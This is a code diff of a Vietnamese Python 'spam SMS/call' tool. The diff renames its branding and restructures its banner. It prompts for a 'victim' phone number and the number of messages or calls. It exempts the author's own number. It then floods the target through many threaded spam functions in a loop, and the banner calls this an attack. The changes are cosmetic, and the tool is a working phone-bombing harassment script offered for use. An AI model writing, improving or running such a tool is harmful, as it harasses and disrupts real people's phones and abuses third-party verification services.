@@ -1,18 +1,15 @@
 import os
-import time
-import re
-import sys
-
-# Define the banner text
-banner_text = """
+import requests,os,time,re,json,uuid,random,sys
+from concurrent.futures import ThreadPoolExecutor
+ban = """
 \033[1;39m        ██╗░░██╗░░░░░░████████╗░█████╗░░█████╗░██╗░░░░░
 \033[1;39m        ██║░██╔╝░░░░░░╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
 \033[1;39m        █████═╝░█████╗░░░██║░░░██║░░██║██║░░██║██║░░░░░
-\033[1;39m        ██╔═██╗░╚════╝░░░██║░░░██║░░██║██║░░██║██║░░░░░
+  \033[1;39m      ██╔═██╗░╚════╝░░░██║░░░██║░░██║██║░░██║██║░░░░░
 \033[1;39m        ██║░╚██╗░░░░░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗
 \033[1;39m        ╚═╝░░╚═╝░░░░░░░░░╚═╝░░░░╚════╝░╚════╝░╚══════╝
-\033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  \033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  \033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ╔══════════════════════════════════════════════════════════╗
 ║ ~[⟨⟩] ➩ ADMIN:       ANH KHOA                            ║
 ║ ~[⟨⟩] ➩ FACEBOOK:    VƯƠNG QUỐC ANH KHOA                 ║
@@ -26,27 +23,24 @@ banner_text = """
   • Để dừng tấn công bấm [ CTRL + c ] 2 lần
   • Khi chạy tool máy sẽ có cảm giác lag !!!
 \033[1;31m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
 """
-
-# Function to display the banner
-def display_banner():
-    os.system("clear")
-    for h in banner_text:
-        sys.stdout.write(h)
-        sys.stdout.flush()
-        time.sleep(0.0003)
-
-# Main script execution
-if __name__ == "__main__":
-    display_banner()
-    sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
-    while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$", sdt):
-        print("⚜ Sai Định Dạng !!")
-        sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
-    count = int(input("[ + ] Số Tin Nhắn / Call [ Nên Để 200 ]: "))
-    if sdt == "0965403749":
-        print("SỐ ADM SPAM CÁI GÌ :)) ")
-        exit()
+def banner():
+  os.system("clear")
+  for h in ban:
+    sys.stdout.write(h)
+    sys.stdout.flush()
+    time.sleep(0.0003)   
+banner()
+amount = 5000
+sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
+while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
+  print("⚜ Sai Định Dạng !!")
+  sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
+count = int(input("[ + ] Số Tin Nhắn / Call [ Nên Để 200 ]: "))
+if sdt == "0965403749":
+  print("SỐ ADM SPAM CÁI GÌ :)) ")
+  exit()
 
 threading = ThreadPoolExecutor(max_workers=int(100000))  
 def vayvnd(sdt):
@@ -3506,10 +3500,10 @@ def run(sdt,i):
   threading.submit(spamcall,sdt)
   threading.submit(KILO,sdt)
   threading.submit(GAPO,sdt) 
-  print("[ HACKATO ] Send SMS - Call | Delay : 5 | Trạng Thái : Thành Công ",)  
+  print("[ KHOA ] Send SMS - Call | Delay : 5 | Trạng Thái : Thành Công ",)  
   for j in range(0, 5):
     # code trong vòng lặp
-    print(f"[ HACKATO ] | LOADING \r",end="")
+    print(f"[ KHOA ] | LOADING \r",end="")
     # code by AwmxBaby
 for i in range(1,count+1):
   run(sdt,i)
